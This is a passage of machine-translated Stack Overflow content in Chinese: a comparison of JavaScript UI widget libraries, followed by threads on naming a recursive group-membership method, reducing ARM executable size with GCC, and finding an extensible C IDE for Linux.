2.  [Webix](http://webix.com) - 一个先进的、[易学的](https://softwareengineering.stackexchange.com/questions/271793/literal-strings-vs-object-properties-in-javascript)、移动友好的、响应式的和丰富的免费开源 JavaScript UI 组件库。Webix[从](http://webix.com/migration-from-dhtmlx-touch/)[DHTMLX Touch](http://dhtmlx.com/touch/) （一个开发了 8 年的项目 - 见下文）中分离出来，并继续成为一个独立的 UI 组件框架。[GPL3 版本](http://webix.com/licenses/) [允许商业使用](http://forum.webix.com/discussion/2114/webix-gpl-as-ui-on-commercial-server)，并允许使用 Webix的非 GPL 应用程序通过[FLOSS 的许可证豁免来](http://forum.webix.com/discussion/4023/does-an-open-source-app-that-uses-webix-have-to-become-gpl-licensed)保留其许可证，例如 MIT 。Webix 有 55 个 UI 小部件，包括树、网格、treegrids 和图表。资金来自带有一些高级小部件（Pivot、Scheduler、Kanban、[org chart ）的商业版](http://docs.webix.com/desktop__organogram.html)ETC。）。Webix 拥有广泛的免费和商业小部件列表，并与最流行的[框架](https://docs.webix.com/desktop__third_party_integration.html)（React、Vue、Meteor 等）和[UI 组件](https://docs.webix.com/desktop__extensions.html)集成。

    ![Webix](https://i.stack.imgur.com/DixaM.png)

    [皮肤](http://docs.webix.com/samples/16_skins/)看起来很现代，并包含[Material Design](http://docs.webix.com/desktop__material_design.html)主题。[Touch 主题](http://docs.webix.com/samples/16_skins/02_touch.html)看起来也很像 Material Design 。另请参阅[皮肤生成器](http://webix.com/skin-builder/)。

    [最小的 GitHub 存在](https://github.com/webix-hub/tracker/issues/149)，但包括库代码和[文档](https://github.com/webix-hub/docs)（仍需要重大改进）。Webix 的缺点是团队规模小且[缺乏营销](http://forum.webix.com/discussion/3252/why-is-webix-so-little-known)。但是，他们一直在响应用户反馈，无论是[在 GitHub 上](https://github.com/webix-hub/tracker/issues?q=author%3Adandv)还是[在他们的论坛上](http://forum.webix.com/profile/discussions/9889/dandv)。

    该库很精简（截至 2015 年，所有 55 个小部件都为 128Kb gzip+minified），[比 ExtJS、dojo 和其他更快](http://webix.com/widget/datatable/)，而且设计看起来很漂亮。当前版本的 Webix（v6，截至 2018 年 11 月）变得更重（[400 - 676kB 缩小](https://github.com/webix-hub/webix/issues/252#issuecomment-439318512)但未压缩）。

    [Webix.com](http://webix.com)上的演示外观和功能都*很棒*。开发商[XB Software](http://xbsoftware.com/)将 Webix 用于他们为付费客户构建的解决方案中，因此可能会有一个良好的、有资金支持的未来。

    Webix 的目标是向后兼容到 IE8，因此带来[了一些](https://forum.webix.com/discussion/32836/is-webix-still-using-the-promiz-library)技术[债务](https://docs.webix.com/desktop__server_offline.html#comment-4153625513)。

    [Wikipedia](https://en.wikipedia.org/wiki/Webix) • [GitHub](https://github.com/webix-hub/tracker) • [Playground/sandbox](https://snippet.webix.com) •[管理仪表板演示](http://webix.com/demos/admin-app/)•[演示](http://webix.com/demos)•[小部件示例](http://docs.webix.com/samples)

3.  [react-md](https://react-md.mlaursen.com/) - 麻省理工学院许可的 React 材料设计 UI 组件库。响应迅速，可访问。实现从简单（按钮、卡片）到复杂（可排序表、自动完成、标签输入、日历）的组件。[一位主要作者](https://github.com/mlaursen/react-md/graphs/contributors)，约 1900 颗 GitHub 星。

4.  [kendo](/questions/tagged/kendo "显示标记为“剑道”的问题") - 基于 jQuery 的 UI 工具包，具有 40 多个基本的开源小部件，以及商业专业小部件（网格、树、图表等）。响应式和移动支持。适用于 Bootstrap 和 AngularJS。现代，具有[材料设计主题](http://demos.telerik.com/kendo-ui/themebuilder/)。该[文档可在 GitHub 上获得](https://github.com/telerik/kendo-docs)，它已经启用了来自用户的大量贡献（截至 2015 年 1 月，4500 多个提交，500 多个 PR）。

    ![在此处输入图像描述](https://i.stack.imgur.com/Npn31.png)

    在商业上得到了很好的支持，声称拥有数百万开发人员，并且是一个大型开发人员工具系列的一部分。[Telerik 获得了许多赞誉](https://en.wikipedia.org/wiki/Telerik)，是一家跨国公司（美国保加利亚），被[Progress Software](https://en.wikipedia.org/wiki/Progress_Software)收购，是[思想](http://developer.telerik.com/featured/planning-front-end-javascript-application/) [领袖](http://developer.telerik.com/featured/front-end-driven-applications-new-approach-applications/)。

    [Kendo UI Professional 开发人员许可证费用为 700 美元](http://www.telerik.com/purchase/kendo-ui)，大多数论坛的[发布访问权限](http://www.telerik.com/forums/kendo-ui/general-discussions)取决于拥有许可证或处于试用期。

    [维基百科] • [GitHub/Telerik](https://github.com/telerik/) •[演示](http://demos.telerik.com/kendo-ui/)• [Playground](http://dojo.telerik.com/) •[工具](http://blogs.telerik.com/kendoui/posts/14-08-28/kendo-ui-tooling-which-productivity-tools-do-you-use-)

5.  [OpenUI5](http://openui5.org/) -[基于 jQuery 的](https://github.com/SAP/openui5/issues/2238#issuecomment-440511567)UI 框架，包含 180 个小部件，获得 Apache 2.0 许可，完全开源，由德国软件巨头[SAP SE](https://en.wikipedia.org/wiki/SAP_SE)资助。

    ![OpenUI5](https://i.stack.imgur.com/qgDOU.png)

    社区比 Webix 大得多，[SAP](http://openui5.org/faq.html#openAndMe)[正在招聘开发人员来发展 OpenUI5](http://scn.sap.com/community/developer-center/front-end/blog/2014/10/08/ui5-is-growing-and-hiring-a-look-behind-the-scenes)，他们[在 OSCON 2014 上展示了 OpenUI5](http://openui5.tumblr.com/post/94420670937/openui5-at-oscon-2014)。

    桌面主题相当乏味，但[面向网络和移动设备的 Fiori 设计](https://experience.sap.com/fiori-design/)看起来干净利落。

    [维基百科](https://en.wikipedia.org/wiki/OpenUI5)• [GitHub](https://github.com/SAP/openui5) •[移动优先控件演示](https://openui5.hana.ondemand.com/explored.html)•[桌面控件演示](https://openui5.hana.ondemand.com/#test-resources/sap/ui/table/demokit/Table.html)• [SO](https://stackoverflow.com/questions/tagged/sapui5)

6.  [DHTMLX](http://dhtmlx.com/) - 用于构建丰富的 Web 和移动应用程序的 JavaScript 库。看起来最像 ExtJS - 检查[演示](http://dhtmlx.com/docs/customers.shtml)。[自 2005 年以来](https://en.wikipedia.org/wiki/Dhtmlx)一直在开发，但看起来仍然很现代。[除 TreeGrid 之外](http://dhtmlx.com/docs/products/licenses.shtml)的所有组件都在 GPLv2 下可用，但许多组件的高级功能仅在商业 PRO 版本中可用 - 参见例如[树](http://dhtmlx.com/docs/products/dhtmlxTree/editions.shtml)。声称被许多财富 500 强公司使用。

    ![DHTMLX](https://i.stack.imgur.com/jS7cw.png)

    [在 GitHub](https://github.com/DHTMLX)（缺少[主库代码](http://forum.dhtmlx.com/viewtopic.php?f=12&t=38910)）和[StackOverflow](https://stackoverflow.com/questions/tagged/dhtmlx)但[活跃的论坛](http://forum.dhtmlx.com/)上的存在最少。该[文档在 GitHub 上*不可*](http://forum.dhtmlx.com/viewtopic.php?f=13&t=38915)用，这使得社区难以改进。

7.  [Polymer](https://www.polymer-project.org)，一种 Web Components 填充物，加上[Polymer Paper](https://www.polymer-project.org/components/paper-elements/demo.html)，Google 的 Material 设计实现。针对网络和移动应用程序。没有树甚至网格之类的高级小部件，但它提供的控件是移动优先且响应迅速的。被许多大玩家使用，例如[IBM](http://www.ibm.com/developerworks/library/wa-polymer/)或[USA Today](https://rio16.usatoday.com/olympics-rio-2016/schedule-results)。

    ![聚合物纸元素](https://i.stack.imgur.com/GppAK.png)

8.  [Ant Design](https://ant.design/docs/spec/introduce)声称它是“一种用于后台应用程序的设计语言”，受“自然”的影响，帮助设计师[“为开发者团队创造低熵氛围”](https://ant.design/docs/spec/values)。这可能是“企业 Web 应用程序的 UI 组件”的中文翻译很差。这是一个用 TypeScript 编写的 React UI 库，包含许多组件，从简单（按钮、卡片）到高级（[自动完成](https://ant.design/components/auto-complete/)、[日历](https://ant.design/components/calendar/)、[标签输入](https://ant.design/components/tag/)、[表格](https://ant.design/components/table/)）。

    该项目[诞生于中国](https://hackernoon.com/interesting-javascript-libraries-born-in-china-d50d1bb81355)，[深受中国公司欢迎](https://ant.design/docs/spec/introduce#Who's-using-Ant-Design)，部分文档仅提供[中文](https://ant.design/docs/spec/motion)版本。[在 GitHub 上](https://github.com/ant-design/ant-design/graphs/contributors)很受欢迎，但它[犯了将社区](https://blog.codinghorror.com/the-ugly-american-programmer/)分成中英文聊天室的错误。该设计看起来像 Material-ish，但字体很小，而且信息看起来在空白处丢失。

9.  [PrimeUI](http://www.primefaces.org/primeui/) - 基于 jQuery UI 的 45 多个丰富小部件的集合。阿帕奇 2.0 许可证。小型[GitHub 社区](https://github.com/primefaces/primeui)。提供 35 个高级主题。

10.  [qooxdoo](http://qooxdoo.org) - “具有一组连贯的单个组件的通用 JavaScript 框架”，由德国托管服务提供商 1&1 开发和资助（参见[贡献者](http://qooxdoo.org/project/developers#initiator_and_maintainer)，世界上最大的托管公司之一。GPL/ [EPL](https://en.wikipedia.org/wiki/Eclipse_Public_License)（商业友好许可证）。

    移动主题看起来很现代，但桌面主题看起来很旧（渐变）。

    [![酷狗](https://i.stack.imgur.com/0frDt.png)](http://demo.qooxdoo.org/devel/demobrowser/#data~Tree_Columns.html)

    [维基百科](https://en.wikipedia.org/wiki/Qooxdoo)• [GitHub](https://github.com/qooxdoo/qooxdoo) • [Web/移动/桌面演示](http://qooxdoo.org/demos)•[小部件演示浏览器](http://demo.qooxdoo.org/devel/demobrowser/#data~Tree_Columns.html)•[小部件浏览器](http://demo.qooxdoo.org/current/widgetbrowser/)• [SO](https://stackoverflow.com/questions/tagged/qooxdoo) •[游乐场](http://demo.qooxdoo.org/devel/playground/)•[社区](http://qooxdoo.org/community)

11.  [jQuery UI](http://jqueryui.com/) - 易于上手；看起来有点过时；缺少高级小部件。当然，您可以将它与特定需求的独立小部件组合起来，例如[树](http://jquery-plugins.net/tag/treeview)或[其他 UI 组件](http://plugins.jquery.com/tag/ui/)，但对于任何其他框架也可以这样说。

12.  [![](https://i.stack.imgur.com/bpLjl.png)角度](/questions/tagged/angular "显示标记为“角度”的问题")+[角度用户界面](http://angular-ui.github.io/)。虽然 Angular 得到了 Google 的支持，但它在即将到来的 2.0 版本中进行了彻底改造，并且“用户将需要掌握一种新的架构。还确认不会有[从 Angular 1.X 迁移到2.0](http://jaxenter.com/angular-2-0-112094.html) ”。此外，共识似乎是[Angular 2 直到一两年后才能真正投入使用](https://news.ycombinator.com/item?id=8507872)。Angular UI 的小部件相对较少（例如，没有树）。

13.  [DojoToolkit](http://dojotoolkit.org)及其强大的 Dijit[小部件](http://demos.dojotoolkit.org/demos/)集。完全[开源并在 GitHub 上积极开发](https://github.com/dojo/dojo/pulls)，但现在（2018 年 11 月）开发集中在新的[dojo.io](https://dojo.io/)框架上，该框架几乎没有基本的小部件。BSD/AFL 许可证。开发始于 2004 年，Dojo 基金会由 IBM、Google 和其他公司赞助 - 请参阅[Wikipedia](https://en.wikipedia.org/wiki/Dojo_Toolkit)。[关于 SO 的 7500 个问题](https://stackoverflow.com/questions/tagged/dojo)。

    ![道场迪吉特](https://i.stack.imgur.com/V21c3.png)

    主题看起来面向桌面且过时 - 请参阅**[dijit 中的主题测试器](http://download.dojotoolkit.org/release-1.10.3/dojo-release-1.10.3/dijit/themes/themeTester.html?theme=nihilo)**。[官方主题预览](http://dojo-toolkit.33424.n3.nabble.com/Theme-tester-not-switching-themes-td4003583.html)器坏了，只显示“Claro”。存在一个[Bootstrap 主题](http://martinpengellyphillips.github.com/dbootstrap/)，它看起来很像 Bootstrap，但不使用 Bootstrap 类。2015 年 1 月，我开始了一个关于**[为 Dojo 构建 Material Design 主题的主题](http://dojo-toolkit.33424.n3.nabble.com/Material-Design-inspired-theme-td4004856.html)**，该主题在最初的几个小时内就很受欢迎。[但是，对于为当前 Dojo 1.10 与下一个 Dojo 2.0](http://ibm-js.github.io/deliteful/)构建该主题存在疑问。对该主题的回复显示了一个活跃而广泛的社区，涵盖了许多时区。

    不幸的是，[Dojo 已经不再流行](https://www.quora.com/Why-has-the-Dojo-toolkit-disappeared-off-peoples-radar)，[使用它的公司似乎也越来越少](https://www.quora.com/Why-do-so-few-companies-use-the-Dojo-Toolkit)，尽管[在企业界（曾经？）拥有强大的立足点](https://stackoverflow.com/a/2451785/1269037)。在 2009-2012 年，它的[学习曲线陡峭](https://www.quora.com/Why-do-so-few-companies-use-the-Dojo-Toolkit/answer/Cornel-Masson)，文档需要改进；虽然[文档有了很大](http://dojotoolkit.org/documentation/)的改进，但目前还不清楚使用 Dojo 有多么容易。

    对于[Material Design 主题](http://dojo-toolkit.33424.n3.nabble.com/Material-Design-inspired-theme-td4004856.html)，Dojo（2.0？）可能是杀手级 UI 组件框架。

    [维基百科](https://en.wikipedia.org/wiki/Dojo_Toolkit)• [GitHub](https://github.com/dojo) •[主题](http://download.dojotoolkit.org/release-1.10.3/dojo-release-1.10.3/dijit/themes/themeTester.html?theme=nihilo)•[演示](http://demos.dojotoolkit.org/demos/)•[桌面小部件](http://dojotoolkit.org/features/desktop)• [SO](https://stackoverflow.com/questions/tagged/dojo)

14.  [Enyo](http://enyojs.com/sampler/latest/) - 针对移动和电视应用程序的前端库（例如大型触摸友好控件）。由 LG Electronix 开发并[在 GitHub 上获得 Apache 许可](https://github.com/enyojs/enyo)。

15.  激进的[Cappuccino](http://www.cappuccino-project.org/learn/) - Objective-J（JavaScript 的超集）而不是 HTML+CSS+DOM

16.  [Mochaui](https://github.com/mui/mochaui)，MooTools UI 库用户界面库。<300 GitHub 星。

17.  [CrossUI](http://crossui.com/) - 跨浏览器 JS 框架，用于开发和打包完全相同的代码和 UI 到 Web 应用程序、本机桌面应用程序（Windows、OS X、Linux）和移动应用程序（iOS、Android、Windows Phone、黑莓）。开源 LGPL3。特色 RAD 工具（表单生成器等）。UI 看起来是面向桌面的，而不是面向 Web 的。[积极开发，小社区](http://www.crossui.com/Forum/)。[在 GitHub 上不存在](https://github.com/linb/CrossUI)。

18.  [ZinoUI](http://zinoui.com/demos) - 简单的小部件。例如，DataTable 甚至不支持排序。

19.  [Wijmo](http://wijmo.com/) - 漂亮的商业小部件，旧的（jQuery UI）小部件[在 GitHub 上开源](https://github.com/wijmo)（他们的开发于 2013 年停止）。由GrapeCity 的一个部门[ComponentOne开发。](http://www.componentone.com/)请参阅[Wijmo Complete 与 Open](/widgets/license/wijmo-complete-vs-wijmo-open/)。

20.  [CxJS](https://cxjs.io) - 基于 React、Babel 和 webpack 的商业 JS 框架，提供表单元素、表单验证、高级网格控制、导航元素、工具提示、覆盖、图表、路由、布局支持、主题、文化相关格式等。

[![CxJS](https://i.stack.imgur.com/uYBum.png)](https://i.stack.imgur.com/uYBum.png)

[小部件](https://gallery.cxjs.io)-[演示应用程序](https://cxjs.io/demos)-[示例](https://cxjs.io/examples)- [GitHub](https://github.com/codaxy/cxjs)

### 全栈框架

1.  [SproutCore](http://sproutcore.com/about/) - 由 Apple 为具有本机性能的 Web 应用程序开发，在客户端处理大型数据集。为 iCloud.com 提供支持。不适用于小部件。

2.  [Wakanda](https://en.wikipedia.org/wiki/Wakanda_(software))：针对商业/企业网络应用程序 - 请参阅[什么是 Wakanda？](http://doc.wakanda.org/home2.en.html#/What-is-Wakanda/What-is-Wakanda.100-660545.en.html). 建筑学：

    *   Wakanda Server（服务器端 JavaScript（[自定义引擎](https://www.youtube.com/watch?v=SAZghHMM2e8#t=384)）+开源[NoSQL 数据库](http://wakandadb.org/)）
    *   用于表格、表单、报告的桌面 IDE 和所见即所得编辑器
    *   Wakanda 应用程序框架（数据源层 + 基于浏览器的界面小部件）有助于跨桌面和移动设备的浏览器和设备兼容性

        Wakanda 高度集成，[包含大量开箱即用的功能](https://www.youtube.com/watch?v=SAZghHMM2e8#t=487)，但[GitHub 社区](https://github.com/Wakanda/)和[SO 存在](https://stackoverflow.com/search?q=wakanda)非常小。

3.  [Servoy](http://www.servoy.com/) - “SQL 数据库的跨平台前端开发和部署环境”。拥有“完整的 WYSIWIG（所见即所得）HTML5 UI 设计器，具有与后端服务的内置数据绑定”、响应式设计，支持 HTML6 Web 组件、Websockets 和移动平台。[用 Java 编写并使用](https://wiki.servoy.com/display/DOCS/Intro+to+Servoy+Concepts)[各种 JavaBean](https://wiki.servoy.com/display/samples/Sample+CRM)生成 JavaScript 代码。

4.  [SmartClient/SmartGWT](https://en.wikipedia.org/wiki/SmartClient) - 与 Java 服务器相结合的移动和跨浏览器 HTML5 UI 组件。旨在构建功能强大的商业应用程序 - 请参阅[演示](http://smartclient.com/#Welcome)。

5.  [Vaadin](https://vaadin.com/learn) - 全栈 Java/GWT + JavaScript/HTML3 Web 应用程序框架

6.  [Backbase](https://en.wikipedia.org/wiki/Backbase) - 门户软件

7.  [Shiny](http://shiny.rstudio.com/gallery/) - R 上的前端库，具有可视化、布局和控制小部件

8.  [ZKOSS](http://www.zkoss.org/product/zk) : Java+jQuery+Bootstrap 框架，用于构建企业 Web 和移动应用程序。

### CSS 库 + 最小的小部件

这些库不实现复杂的小部件，例如带有排序/过滤、自动完成或树的表格。

1.  [引导程序](http://getbootstrap.com)

2.  [Foundation for Apps](http://foundation.zurb.com/apps/) - 基于 AngularJS 的响应式前端框架；更多的[网格/布局/导航库](http://foundation.zurb.com/apps/docs/#!/grid)

3.  [UI Kit](http://getuikit.com/docs/smooth-scroll.html) - 类似于 Bootstrap，具有更少的小部件，但带有官方的非画布。

### 使用 HTML Canvas 的库

使用画布元素可以完全控制 UI，并具有出色的跨浏览器兼容性，但[代价是缺少原生浏览器功能](https://stackoverflow.com/a/6912764/1269037)，例如通过 Ctrl/Cmd+F 进行页面搜索。

1.  [斑马](http://www.zebkit.com/)-[演示](http://repo.zebkit.org/latest/samples/uidemo.html)

### 自 2014 年 12 月起不再开发

1.  [雅虎！用户界面 - YUI](http://developer.yahoo.com/yui/)，于 2005 年推出，但不再由核心贡献者维护 - 请参阅[公告](http://yahooeng.tumblr.com/post/96098168666/important-announcement-regarding-yui)，其中强调了大型 UI 小部件库被视为开发人员不想被锁定的围墙花园的原因。
2.  [回声3](http://echo.nextapp.com/site/echo3)，[GitHub](https://github.com/echo3)。支持编写不需要开发人员具备 HTML、HTTP 或 JavaScript 知识的服务器端 Java 应用程序，或基于 JavaScript 的客户端应用程序不需要服务器，但可以通过 AJAX 与服务器进行通信。最后更新：2013 年 7 月。
3.  [充足的SDK](http://www.amplesdk.com/examples/)
4.  更简单的小部件[livepipe.net](http://livepipe.net/control)
5.  [JxLib](https://github.com/JxLib/JxLib)
6.  [里亚托](https://groups.yahoo.com/neo/groups/rialto-dev/info)
7.  简单的 UI 套件
8.  [原型-ui](http://www.prototype-ui.com)

### 其他列表

*   [Best of JS - 组件工具包](https://bestofjs.org/tags/component)
*   维基百科[对 JavaScript 框架的比较](https://en.wikipedia.org/wiki/Comparison_of_JavaScript_frameworks)
*   维基百科的[GUI 相关 JavaScript 库列表](https://en.wikipedia.org/wiki/List_of_JavaScript_libraries#GUI-related_.28widget.29)
*   [jqueryuiwidgets.com](http://jqueryuiwidgets.com) - 详细的 jQuery 小部件功能比较

# coding-style - 列出当前用户所属的所有用户组的方法名称

> ID：200286
> 
> 赞同：0
> 
> 时间：2008-10-14T07:44:39.790
> 
> 标签：coding-style

我们就方法名称进行了激烈的讨论。

我们有一堂课`User`。用户上有一个名为“组”的属性。它包含直接包含用户的所有组。没关系。我们遇到的问题是递归列出所有用户组及其“父”组的方法的名称，并返回所有组的列表，其中用户可以被视为成员。

```
User u = <get user>;
IList<UserGroup> groups = u.XYZ();

Console.WriteLine("User {0} is member of: ", u);
foreach(UserGroup g in groups) 
   Console.WriteLine("{0}", g); 
```

我的同事带来了：

```
u.GetAllGroups();       // what groups?
u.GetMemberOfGroups();  // doesn't make sense
u.GroupsIAmMemberOf();  // long
u.MemberOf();           // short, but the description is wrong
u.GetRolesForUser();    // we don't work with roles, so GetGroupsForUser ?
u.GetOccupiedGroups();  // is the meaning correct? 
```

你会提议什么名字？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2008-10-14T08:32:08.527

为了[高内聚和低耦合](http://en.wikipedia.org/wiki/Cohesion_(computer_science))的利益，我建议将该功能完全保留在您的 User 类之外。如果该功能位于不同的类中，则为多个调用实现缓存也应该更容易。

例如：

```
User u = <get user>;
IList<UserGroup> groups = SecurityModel.Groups.getMembership(u); 
```

然后，您可以选择在 Groups 对象中缓存组/用户成员资格，从而提高其他用户未来组成员资格请求的效率。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2008-10-14T07:46:37.043

我想我会选择：

```
u.GetGroupMembership() 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2008-10-14T07:51:46.110

```
u.GetGroups() 
```

我想，除非您的应用程序中的组的含义有一些歧义。（我喜欢尽可能少打字！）

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2008-10-14T07:54:31.190

鉴于没有参数，我建议使用一个属性，例如

```
u.Groups; 
```

或者

```
u.UserGroups; // if Groups is ambiguous 
```

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-10-31T11:34:28.987

```
if (the signature of the property Groups cannot be changed)
{
    I think you are screwed
    and the best thing I can think of
    is another property named AllGroups
    // u.Groups and u.GetWhatever() look very inconsistently
}
else
{
    if (you are okay with using the term "group")
    {
        I would select one of these variants:
            {
                a pair of properties named ParentGroups and AncestorGroups
            }
            or
            { 
                a parameterized method or property Groups(Level)
                where Level can be either PARENTS (default) or ANCESTORS
            }
    }
    else
    {
        I would consider replacing "group" with "membership"
        and then I would select one of these variants:
            {
                a pair of properties named DirectMemberships and AllMemberships
            }
            or
            { 
                a parameterized method or property Memberships(Level)
                where Level can be either DIRECT_ONLY (default) or ALL
            }
    }
} 
```

这有什么意义吗？;-)

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2008-10-14T07:52:48.137

我同意 Greg 的观点，但会更简单：

```
 u.GroupMembership(); 
```

考虑到返回类型（组列表），我认为附加动词 Get 有点没用

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2008-10-14T08:30:33.850

我来自 Stej 的团队:-) 用户身上已经有一个名为“Groups”的属性。它包含直接包含用户的所有组。没关系。

我们遇到的问题是递归列出所有用户组及其“父”组的方法的名称，并返回所有组的列表，其中用户可以被视为成员。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2008-10-14T08:48:20.990

根据你们工作的环境，你可以利用现有的框架来做这类事情，而不是自己动手。如果您使用的是 .NET 2.0 或更高版本，我建议您利用[System.Web.Security.RoleProvider](http://msdn.microsoft.com/en-us/library/system.web.security.roleprovider.aspx)类。我以前的回答在[这里](https://stackoverflow.com/questions/199252/what-is-the-best-way-to-manage-permissions-for-a-web-application-bitmask-or-dat#199312)对此有更多的想法。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2008-10-14T08:59:22.807

角色是扁平的，我们需要更强大的东西。我们也不想被 Web 环境所束缚。

# embedded - 减小可执行文件大小的过程

> ID：200292
> 
> 赞同：17
> 
> 时间：2008-10-14T07:48:55.773
> 
> 标签：embedded, arm

我正在生成一个十六进制文件以在我希望保持在 32K 以下的 ARM 处理器上运行。它目前比这大得多，我想知道是否有人可能对瘦身的最佳方法有一些建议？

这是我到目前为止所做的

1.  所以我在它上面运行了'size'来确定十六进制文件有多大。
2.  然后再次“大小”以查看每个目标文件有多大，该链接用于创建十六进制文件。似乎大部分大小来自外部库。
3.  然后我使用'readelf'来查看哪些函数占用的内存最多。
4.  我搜索了代码，看看是否可以消除对这些函数的调用。

这就是我卡住的地方，有些函数我不直接调用（例如_vfprintf），我找不到调用它的函数，所以我可以删除调用（因为我认为我不需要它）。

那么接下来的步骤是什么？

对答案的回应：

*   正如我所看到的，调用了一些占用大量内存的函数。但是我找不到它的名字。
*   我想省略那些函数（如果可能的话），但我找不到调用它们的东西！我猜可以从任意数量的库函数中调用。
*   链接器按需要工作，我认为，它只包含相关的库文件。你怎么知道是否只包含相关功能？你可以为此设置一个标志或其他东西吗？
*   我正在使用 GCC

* * *

## 回答 #1

> 赞同：17
> 
> 时间：2008-10-14T10:04:58.977

一般清单：

*   确保禁用了编译器和链接器调试选项
*   编译和链接打开所有大小选项（gcc 中的 -Os）
*   `strip`在可执行文件上运行
*   生成地图文件并检查您的函数大小。您可以让链接器生成映射文件（`-M`使用 ld 时），也可以在最终可执行文件上使用 objdump（请注意，这仅适用于未剥离的可执行文件！）这实际上并不能解决问题，但它会让你知道最严重的罪犯。
*   用于`nm`调查从每个目标文件中调用的符号。这应该有助于找到谁在调用您不想调用的函数。

最初的问题是一个关于仅包括相关功能的子问题。`gcc`将包括使用的每个目标文件中的所有函数。换句话说，如果您有一个包含 10 个函数的目标文件，那么即使实际调用了一个 1，所有 10 个函数都包含在您的可执行文件中。

标准库（例如 libc）会将函数拆分为许多单独的目标文件，然后将其归档。然后可执行文件与存档链接。通过拆分成许多目标文件，链接器能够仅包含实际调用的函数。（这假设您正在静态链接）

没有理由你不能做同样的把戏。当然，您可以争辩说，如果没有调用这些函数，您可能可以自己删除它们。

如果您要静态链接到其他库，您也可以在它们上运行上面列出的工具，以确保它们遵循类似的规则。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2008-10-14T11:24:58.863

另一个可能节省您工作量的优化是 -ffunction-sections、-Wl、--gc-sections，假设您使用的是 GCC。但是，不需要告诉一个好的工具链。

解释：GNU ld 链接部​​分，GCC 会为每个翻译单元发出一个部分，除非你另有说明。但是在 C++ 中，依赖图中的节点是对象和函数。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2008-12-09T20:19:17.310

在深度嵌入的项目中，我总是尽量避免使用任何标准库函数。即使是像“strtol()”这样的简单函数也会放大二进制文件的大小。如果可能的话，只是简单地避免这些电话。

在大多数深度嵌入式项目中，您不需要通用的“printf()”或动态内存分配（许多控制器的 RAM 为 32kb 或更少）。

而不是仅仅使用“printf()”，我使用了一个非常简单的自定义“printf()”，这个函数只能打印十六进制或十进制格式的数字。大多数数据结构是在编译时预分配的。

* * *

## 回答 #4

> 赞同：2
> 
> 时间：2008-10-14T08:15:58.013

只是为了仔细检查和记录以供将来参考，但是您使用拇指指令吗？它们是普通指令的 16 位版本。有时您可能需要 2 条 16 位指令，因此不会节省 50% 的代码空间。

一个体面的链接器应该只具有所需的功能。但是，您可能需要编译器和链接设置来为单个链接打包函数。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2008-10-14T09:37:25.413

好的，最后我只是将项目简化为最简单的形式，然后慢慢地一个一个地添加文件，直到我要删除的函数出现在“readelf”文件中。然后，当我得到文件时，我将所有内容都注释掉并慢慢添加内容，直到该功能再次弹出。所以最后我发现了它的名字并删除了所有这些电话......现在它可以按预期工作......甜！

必须是一个更好的方法来做到这一点。

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2012-04-26T19:37:16.507

Andrew EdgeCombe 有一个很棒的列表，但是如果你真的想抓取最后一个字节，[sstrip](http://www.muppetlabs.com/~breadbox/software/elfkickers.html)是一个很好的工具，它是列表中缺少的，并且可以减少更多 kB。

例如，当它自己运行时`strip`，[它可以减少 ~2kB](http://cksum.org/blog/284-compiling-and-using-sstrip)。

[来自旧的 README（请参阅此](https://dev.openwrt.org/browser/trunk/tools/sstrip/src/sstrip.c)间接源文件顶部的注释）：

> strip 是一个小型实用程序，可删除 ELF 文件末尾不属于程序内存映像的内容。
> 
> 大多数 ELF 可执行文件都使用程序头表和节头表构建。然而，为了让操作系统加载、链接和执行程序，只需要前者。strip 尝试提取 ELF 标头、程序标头表及其内容，将其他所有内容留在位桶中。它只能删除文件末尾出现的部分，在要保存的部分之后。然而，这几乎总是包括节头表，偶尔还有一些运行程序时不使用的随机节。

请注意，由于它删除了一些信息，有传言说 sstrip'd 可执行文件与某些工具[存在问题。](http://www.mail-archive.com/discussion@lists.en.qi-hardware.com/msg00657.html)这在来源的评论中有更多讨论。

另外...对于如何制作尽可能小的可执行文件的有趣/疯狂的阅读，[这篇文章](http://www.muppetlabs.com/~breadbox/software/tiny/teensy.html)值得一读。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2015-07-24T13:21:54.193

为了满足这一特定需求：

> •我想省略那些函数（如果可能的话），但我找不到调用它们的东西！！我猜可以从任意数量的库函数中调用。

如果您想分析您的代码库以查看谁调用了什么、由谁调用给定函数等等，SciTools 提供了一个名为“Understand C”的出色工具。

[https://scitools.com/](https://scitools.com/)

我过去经常使用它来执行静态代码分析。它确实可以帮助确定库依赖树。它允许轻松地上下浏览调用树等。

他们提供限时评估，然后您必须购买许可证。

* * *

## 回答 #8

> 赞同：-1
> 
> 时间：2008-10-14T08:02:39.553

你可以看看[可执行压缩](http://en.wikipedia.org/wiki/Executable_compression)之类的东西。

# c - 易于扩展 C 的 IDE

> ID：200305
> 
> 赞同：0
> 
> 时间：2008-10-14T07:54:37.260
> 
> 标签：c, linux, ide, extensibility

我想要一个用于**Linux**中 C的**简单 IDE/编辑器**，我**可以轻松地向其中添加功能**。例如：我想为编辑器添加一个右键菜单项和相关操作。它应该易于扩展和添加任何所需的功能。我尝试了 eclipse CDT，但它需要学习很多东西（我的意思是知道 eclipse 插件架构和 CDT 扩展点和东西）来做我想做的小修改。

 ****谢谢，萨钦

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2008-10-14T08:09:30.973

我个人使用 Code::Blocks，根据他们的网站，它也有一个 Linux 发行版。[http://www.codeblocks.org/](http://www.codeblocks.org/) 我不知道它是否非常可扩展，但它具有您期望从 IDE 获得的所有功能。

量子皮特

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2008-10-14T12:53:51.243

我会尝试 emacs（但你必须在 LISP 中进行编程。当你掌握了括号的诀窍时，这很容易）。您可以根据缓冲区的上下文（.c 而不是 .h）进行编程，它有一个非常大的 c 模式，已经实现了许多最需要的东西。

示例：插入 if

```
;; the indention-thing needs refining
(defun pm-if ()
 "generates if stub"
 (interactive)
 (insert "if () {")
 (indent-according-to-mode)
